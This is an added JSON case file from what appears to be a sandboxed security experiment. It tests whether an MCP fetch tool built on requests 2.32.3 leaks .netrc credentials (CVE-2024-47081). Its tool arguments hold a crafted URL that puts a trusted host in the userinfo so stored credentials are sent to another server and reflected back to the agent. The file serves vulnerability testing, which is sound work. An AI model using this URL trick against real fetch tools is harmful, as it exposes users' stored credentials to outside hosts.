@@ -1,0 +1,79 @@
+{
+  "case_id": "GH-P3-032-fetch-guard-requests-netrc",
+  "direct_runtime_dependency": {
+    "declared_constraint": "requests",
+    "dependency_depth": 1,
+    "dependency_ecosystem": "pypi",
+    "dependency_name": "requests",
+    "dependency_purl": "pkg:pypi/requests",
+    "dependency_scope": "runtime",
+    "fixed_version": "2.32.4",
+    "manifest": "pyproject.toml:dependencies[0]",
+    "relation_status": "affected_exact_direct_runtime",
+    "vulnerable_version": "2.32.3"
+  },
+  "discovery": {
+    "discovered_on": "2026-09-25",
+    "discovery_url": "https://api.github.com/search/repositories?q=MCP+server+fetch+url+language%3APython&sort=stars&order=desc&per_page=30",
+    "repository_commit": "9431b2c8562a4736e8251010639b441c863e2b6c",
+    "repository_url": "https://github.com/Erodenn/fetch-guard",
+    "source": "GitHub",
+    "source_archive_sha256": "a672a050f1000c6d6ddb951b43730e61d4d40c419ef9b60a97d2f3761068a4b4",
+    "source_snapshot_files": {
+      "fetch_guard/http/client.py": "db4dd58baa81bab34a30cde3f4d1106d5b402cfe955f17592601d8f5d34bf720",
+      "fetch_guard/server.py": "9b03c53897cc136881eb734fa05fd9bc79a0d2297b16bb2e80a6ea42ba145a21",
+      "pyproject.toml": "2fed636b1de769ecf84002c09aba4fb45aaaeea0c84221f35e451c437473749b"
+    }
+  },
+  "experiment": {
+    "agent_task": "Call the frozen fetch Tool and report only its returned result.",
+    "container_cap_drop": [
+      "ALL"
+    ],
+    "container_image": "sha256:41a5246af35aeb67b7f61a2fd2a45fd15f16060c34f20a947147e9927bba3efa",
+    "container_image_base": "sha256:77f439e07c7414eadc660c529b462edb18bf64856ab9f7c0bedba410c81019b4",
+    "container_mounts": [
+      "source:ro",
+      "shared_host_runner.py:ro",
+      "host_core.py:ro",
+      "side-specific dependency root:ro",
+      "run output:rw"
+    ],
+    "container_network": "none",
+    "container_security_opt": [
+      "no-new-privileges:true"
+    ],
+    "experiment_type": "SENSITIVE_INFORMATION_DISCLOSURE",
+    "required_repetitions": 3,
+    "same_agent_task": true,
+    "same_frozen_input": true,
+    "same_host_session_boundary": true
+  },
+  "mcp_path_review": {
+    "dependency_api": "requests.get prepares the URL through Session.prepare_request and get_netrc_auth before sending the HTTP request",
+    "external_boundary": "Container-local HTTP boundary on 127.0.0.1:18080; /llms.txt returns 404 and /agent-readback returns HTML reflecting Authorization",
+    "handler_path": "fetch Tool -> fetch_guard/server.py:34-78 -> pipeline.run -> static_fetch -> fetch_guard/http/client.py:44-60 -> requests.get",
+    "sink_readback": "The fetch pipeline extracts the reflected HTML into the fetch result body; the exact role=tool content in model.next_request is L4",
+    "tool": "fetch",
+    "tool_arguments": {
+      "js": false,
+      "links": "domains",
+      "max_words": 200,
+      "strict": false,
+      "timeout": 5,
+      "url": "http://trusted.internal:80@127.0.0.1:18080/agent-readback"
+    },
+    "vulnerability_derived_state": "Requests 2.32.3 selects the trusted.internal .netrc entry and sends its Basic credential to the actual 127.0.0.1 boundary"
+  },
+  "schema_version": "github-direct-case-spec/v1",
+  "vulnerability": {
+    "advisory_url": "https://api.osv.dev/v1/vulns/GHSA-9hjg-9r4m-mvj7",
+    "aliases": [
+      "CVE-2024-47081",
+      "PYSEC-2026-1872"
+    ],
+    "effect_type": "SENSITIVE_INFORMATION_DISCLOSURE",
+    "id": "GHSA-9hjg-9r4m-mvj7",
+    "summary": "Requests may leak .netrc credentials when URL parsing confuses userinfo and destination host"
+  }
+}
